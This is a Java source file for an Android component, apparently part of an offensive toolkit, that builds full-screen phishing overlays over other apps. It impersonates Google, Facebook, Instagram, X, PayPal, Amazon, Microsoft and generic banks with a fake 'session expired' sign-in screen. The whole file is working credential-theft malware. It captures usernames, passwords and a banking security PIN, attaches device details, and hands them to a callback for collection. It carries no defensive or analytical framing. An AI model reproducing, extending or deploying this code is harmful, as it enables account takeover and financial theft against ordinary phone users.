package com.offensive.blackstealth.hijacking;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.text.InputType;
import android.util.Base64;
import android.util.Log;
import android.view.*;
import android.widget.*;
import java.util.*;
import java.util.concurrent.*;

/**
 * Phishing Overlay Generator
 * Creates convincing login overlays for credential capture
 */
public class PhishingOverlay {
    private static final String TAG = "PhishingOverlay";
    
    private Context context;
    private WindowManager windowManager;
    private Map<String, View> activeOverlays;
    private ExecutorService executor;
    private CredentialCallback callback;
    
    public static class CapturedCredentials {
        public String targetApp;
        public String username;
        public String password;
        public String additionalField;
        public long capturedAt;
        public String deviceInfo;
    }
    
    public interface CredentialCallback {
        void onCredentialsCaptured(CapturedCredentials credentials);
    }
    
    // Overlay templates for popular apps
    public enum OverlayTemplate {
        GOOGLE("com.google", "Google", "#4285F4", "#FFFFFF"),
        FACEBOOK("com.facebook", "Facebook", "#1877F2", "#FFFFFF"),
        INSTAGRAM("com.instagram", "Instagram", "#E4405F", "#FFFFFF"),
        TWITTER("com.twitter", "X", "#000000", "#FFFFFF"),
        BANKING("banking", "Bank Login", "#1E3A5F", "#FFFFFF"),
        PAYPAL("com.paypal", "PayPal", "#003087", "#FFFFFF"),
        AMAZON("com.amazon", "Amazon", "#FF9900", "#232F3E"),
        MICROSOFT("com.microsoft", "Microsoft", "#00A4EF", "#FFFFFF"),
        GENERIC("generic", "Login", "#333333", "#FFFFFF");
        
        public String packagePrefix;
        public String displayName;
        public String primaryColor;
        public String textColor;
        
        OverlayTemplate(String pkg, String name, String primary, String text) {
            this.packagePrefix = pkg;
            this.displayName = name;
            this.primaryColor = primary;
            this.textColor = text;
        }
    }
    
    public PhishingOverlay(Context context) {
        this.context = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.activeOverlays = new ConcurrentHashMap<>();
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    public void setCallback(CredentialCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Show phishing overlay for target app
     */
    public void showOverlay(String targetPackage) {
        OverlayTemplate template = getTemplateForPackage(targetPackage);
        showOverlay(targetPackage, template);
    }
    
    public void showOverlay(String targetPackage, OverlayTemplate template) {
        if (activeOverlays.containsKey(targetPackage)) return;
        
        executor.submit(() -> {
            try {
                View overlay = createLoginOverlay(targetPackage, template);
                WindowManager.LayoutParams params = createLayoutParams();
                
                windowManager.addView(overlay, params);
                activeOverlays.put(targetPackage, overlay);
                
                Log.i(TAG, "Overlay shown for: " + targetPackage);
            } catch (Exception e) {
                Log.e(TAG, "Show overlay failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Create login overlay view
     */
    private View createLoginOverlay(String targetPackage, OverlayTemplate template) {
        LinearLayout container = new LinearLayout(context);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);
        container.setBackgroundColor(Color.parseColor("#F5F5F5"));
        container.setPadding(50, 100, 50, 100);
        
        // Card container
        LinearLayout card = new LinearLayout(context);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(60, 80, 60, 80);
        
        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(30);
        cardBg.setStroke(1, Color.parseColor("#E0E0E0"));
        card.setBackground(cardBg);
        
        // Logo/Title
        TextView title = new TextView(context);
        title.setText(template.displayName);
        title.setTextSize(28);
        title.setTextColor(Color.parseColor(template.primaryColor));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 40);
        card.addView(title);
        
        // Session expired message
        TextView message = new TextView(context);
        message.setText("Your session has expired.\nPlease sign in again.");
        message.setTextSize(14);
        message.setTextColor(Color.parseColor("#666666"));
        message.setGravity(Gravity.CENTER);
        message.setPadding(0, 0, 0, 50);
        card.addView(message);
        
        // Username field
        EditText usernameField = createInputField("Email or username", false);
        card.addView(usernameField);
        
        // Password field
        EditText passwordField = createInputField("Password", true);
        card.addView(passwordField);
        
        // Login button
        Button loginButton = new Button(context);
        loginButton.setText("Sign In");
        loginButton.setTextColor(Color.parseColor(template.textColor));
        loginButton.setTextSize(16);
        loginButton.setPadding(0, 30, 0, 30);
        
        GradientDrawable buttonBg = new GradientDrawable();
        buttonBg.setColor(Color.parseColor(template.primaryColor));
        buttonBg.setCornerRadius(15);
        loginButton.setBackground(buttonBg);
        
        LinearLayout.LayoutParams buttonParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        buttonParams.setMargins(0, 40, 0, 0);
        loginButton.setLayoutParams(buttonParams);
        
        loginButton.setOnClickListener(v -> {
            String username = usernameField.getText().toString();
            String password = passwordField.getText().toString();
            
            if (!username.isEmpty() && !password.isEmpty()) {
                captureCredentials(targetPackage, username, password, null);
                hideOverlay(targetPackage);
                
                // Show brief "loading" then dismiss
                Toast.makeText(context, "Verifying...", Toast.LENGTH_SHORT).show();
            }
        });
        card.addView(loginButton);
        
        // Forgot password link
        TextView forgotLink = new TextView(context);
        forgotLink.setText("Forgot password?");
        forgotLink.setTextSize(14);
        forgotLink.setTextColor(Color.parseColor(template.primaryColor));
        forgotLink.setGravity(Gravity.CENTER);
        forgotLink.setPadding(0, 30, 0, 0);
        card.addView(forgotLink);
        
        // Card params
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        cardParams.setMargins(30, 0, 30, 0);
        card.setLayoutParams(cardParams);
        
        container.addView(card);
        return container;
    }
    
    /**
     * Create styled input field
     */
    private EditText createInputField(String hint, boolean isPassword) {
        EditText field = new EditText(context);
        field.setHint(hint);
        field.setTextSize(16);
        field.setTextColor(Color.BLACK);
        field.setHintTextColor(Color.parseColor("#999999"));
        field.setPadding(40, 35, 40, 35);
        
        if (isPassword) {
            field.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        } else {
            field.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
        }
        
        GradientDrawable fieldBg = new GradientDrawable();
        fieldBg.setColor(Color.parseColor("#F8F8F8"));
        fieldBg.setCornerRadius(10);
        fieldBg.setStroke(1, Color.parseColor("#E0E0E0"));
        field.setBackground(fieldBg);
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 15, 0, 15);
        field.setLayoutParams(params);
        
        return field;
    }
    
    /**
     * Create banking overlay with additional fields
     */
    public void showBankingOverlay(String bankName, String targetPackage) {
        executor.submit(() -> {
            try {
                LinearLayout container = new LinearLayout(context);
                container.setOrientation(LinearLayout.VERTICAL);
                container.setGravity(Gravity.CENTER);
                container.setBackgroundColor(Color.parseColor("#1E3A5F"));
                container.setPadding(50, 100, 50, 100);
                
                LinearLayout card = new LinearLayout(context);
                card.setOrientation(LinearLayout.VERTICAL);
                card.setPadding(60, 80, 60, 80);
                
                GradientDrawable cardBg = new GradientDrawable();
                cardBg.setColor(Color.WHITE);
                cardBg.setCornerRadius(20);
                card.setBackground(cardBg);
                
                // Bank logo placeholder
                TextView bankTitle = new TextView(context);
                bankTitle.setText(bankName);
                bankTitle.setTextSize(24);
                bankTitle.setTextColor(Color.parseColor("#1E3A5F"));
                bankTitle.setGravity(Gravity.CENTER);
                bankTitle.setPadding(0, 0, 0, 30);
                card.addView(bankTitle);
                
                // Security notice
                TextView notice = new TextView(context);
                notice.setText("🔒 Secure Login Required");
                notice.setTextSize(12);
                notice.setTextColor(Color.parseColor("#4CAF50"));
                notice.setGravity(Gravity.CENTER);
                notice.setPadding(0, 0, 0, 30);
                card.addView(notice);
                
                EditText userIdField = createInputField("User ID", false);
                EditText passwordField = createInputField("Password", true);
                EditText pinField = createInputField("Security PIN", true);
                pinField.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
                
                card.addView(userIdField);
                card.addView(passwordField);
                card.addView(pinField);
                
                Button loginBtn = new Button(context);
                loginBtn.setText("Secure Login");
                loginBtn.setTextColor(Color.WHITE);
                
                GradientDrawable btnBg = new GradientDrawable();
                btnBg.setColor(Color.parseColor("#1E3A5F"));
                btnBg.setCornerRadius(10);
                loginBtn.setBackground(btnBg);
                
                LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);
                btnParams.setMargins(0, 30, 0, 0);
                loginBtn.setLayoutParams(btnParams);
                
                loginBtn.setOnClickListener(v -> {
                    captureCredentials(targetPackage, 
                        userIdField.getText().toString(),
                        passwordField.getText().toString(),
                        pinField.getText().toString());
                    hideOverlay(targetPackage);
                });
                card.addView(loginBtn);
                
                container.addView(card);
                
                WindowManager.LayoutParams params = createLayoutParams();
                windowManager.addView(container, params);
                activeOverlays.put(targetPackage, container);
                
            } catch (Exception e) {
                Log.e(TAG, "Banking overlay failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Capture and report credentials
     */
    private void captureCredentials(String target, String username, String password, String additional) {
        CapturedCredentials creds = new CapturedCredentials();
        creds.targetApp = target;
        creds.username = username;
        creds.password = password;
        creds.additionalField = additional;
        creds.capturedAt = System.currentTimeMillis();
        creds.deviceInfo = Build.MANUFACTURER + " " + Build.MODEL;
        
        Log.i(TAG, "Credentials captured for: " + target);
        
        if (callback != null) {
            callback.onCredentialsCaptured(creds);
        }
    }
    
    /**
     * Hide overlay for target
     */
    public void hideOverlay(String targetPackage) {
        View overlay = activeOverlays.remove(targetPackage);
        if (overlay != null) {
            try {
                windowManager.removeView(overlay);
            } catch (Exception e) {}
        }
    }
    
    /**
     * Hide all overlays
     */
    public void hideAllOverlays() {
        for (String pkg : new ArrayList<>(activeOverlays.keySet())) {
            hideOverlay(pkg);
        }
    }
    
    private WindowManager.LayoutParams createLayoutParams() {
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
            WindowManager.LayoutParams.TYPE_PHONE;
            
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        return params;
    }
    
    private OverlayTemplate getTemplateForPackage(String pkg) {
        for (OverlayTemplate t : OverlayTemplate.values()) {
            if (pkg.contains(t.packagePrefix)) return t;
        }
        return OverlayTemplate.GENERIC;
    }
    
    public void shutdown() {
        hideAllOverlays();
        executor.shutdown();
    }
}
